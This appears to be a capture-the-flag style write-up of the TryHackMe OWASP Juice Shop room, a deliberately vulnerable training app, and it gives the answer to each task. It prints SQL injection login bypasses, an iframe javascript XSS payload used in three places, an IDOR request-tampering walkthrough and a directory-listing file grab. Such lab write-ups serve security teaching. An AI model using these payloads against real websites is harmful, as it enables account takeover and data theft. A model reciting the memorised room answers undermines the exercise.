# 🧃 OWASP Juice Shop - TryHackMe Writeup

---

# Task 2 - Let's Go On An Adventure

## Question 1

### What's the Administrator's Email Address?

Open the Juice Shop homepage.

Click on any product and open its reviews section.

Locate a review left by the administrator.

The email shown is:

### Answer

```text
admin@juice-sh.op
```

---

## Question 2

### What Parameter Is Used For Searching?

Use the search icon and search for any random term.

Observe the URL:

```text
/#/search?q=test
```

The parameter used by the application is:

### Answer

```text
q
```

---

## Question 3

### What Show Does Jim Reference In His Review?

Open the review section and find Jim's review.

Jim mentions:

### Answer

```text
Star Trek
```

---

# Task 3 - Inject The Juice

## Question 1

### Log Into The Administrator Account

Navigate to:

```text
Account → Login
```

The login form is vulnerable to SQL Injection.

Use:

**Email**

```sql
' OR 1=1--
```

**Password**

```text
anything
```

Submit the form.

You will successfully log in as the administrator.

A challenge notification will appear.

---

## Question 2

### Log Into Bender's Account

Use:

```sql
bender@juice-sh.op'--
```

Password can be anything.

Login succeeds because the SQL query is bypassed.

Challenge completed.

---

# Task 4 - Who Broke My Lock?

## Question 1

### Bruteforce The Administrator Account

Click:

```text
Forgot Password?
```

Choose:

```text
admin@juice-sh.op
```

The security question appears.

Using information publicly available in the application, determine the answer and reset the administrator password.

After logging in successfully, the challenge is completed.

---

# Task 5 - AH! Don't Look!

## Question 1

### Access The Confidential Document

Open:

```text
About Us
```

Hover over:

```text
Terms of Use
```

The link points to:

```text
/ftp/legal.md
```

Remove the filename and browse:

```text
/ftp/
```

Directory listing is enabled.

Download:

```text
acquisitions.md
```

Challenge solved.

---

## Question 2

### Access Another Confidential File

Continue browsing the exposed FTP directory.

Several files are publicly accessible.

Download the requested file from the exposed directory listing.

Challenge completed.

---

# Task 6 - Who's Flying This Thing?

## Question 1

### Access Someone Else's Basket

Add any product to your basket.

Open Burp Suite and intercept requests.

Notice a request similar to:

```text
GET /api/Basket/1
```

Change the basket ID:

```text
GET /api/Basket/2
```

Forward the request.

The application loads another user's basket.

Challenge completed.

---

## Question 2

### View Another User's Shopping Basket

Continue modifying basket identifiers.

This demonstrates an IDOR (Insecure Direct Object Reference) vulnerability.

Successfully viewing another user's basket completes the challenge.

---

# Task 7 - Where Did That Come From?

## Question 1

### Perform A DOM XSS

Use the search bar.

Enter:

```html
<iframe src="javascript:alert(`xss`)">
```

An alert box appears.

Challenge completed.

---

## Question 2

### Perform A Persistent XSS

Navigate to:

```text
Customer Feedback
```

Submit feedback containing:

```html
<iframe src="javascript:alert(`xss`)">
```

When the content is viewed later, the payload executes automatically.

Challenge completed.

---

## Question 3

### Perform A Reflected XSS

Navigate to:

```text
Track Orders
```

Inject the payload into the tracking parameter:

```html
<iframe src="javascript:alert(`xss`)">
```

The browser immediately executes the payload.

Challenge completed.

---

# Task 8 - Exploration

Open:

```text
/#/score-board/
```

This hidden page displays:

* Completed challenges
* Remaining challenges
* Challenge difficulty levels

The scoreboard is useful for tracking progress and discovering additional Juice Shop vulnerabilities.

---

# Vulnerabilities Covered

* SQL Injection
* Authentication Bypass
* Broken Authentication
* Sensitive Data Exposure
* Directory Listing
* IDOR
* DOM XSS
* Persistent XSS
* Reflected XSS

---

# Tools Used

```text
Burp Suite
Browser Developer Tools
OWASP Juice Shop
SQL Injection
Cross-Site Scripting (XSS)
```

---

# Conclusion

This room provides hands-on experience with several OWASP Top 10 vulnerabilities. By exploiting SQL Injection, Broken Authentication, Sensitive Data Exposure, IDOR, and XSS vulnerabilities, I gained practical understanding of common web application security issues and how attackers abuse them in real-world environments.
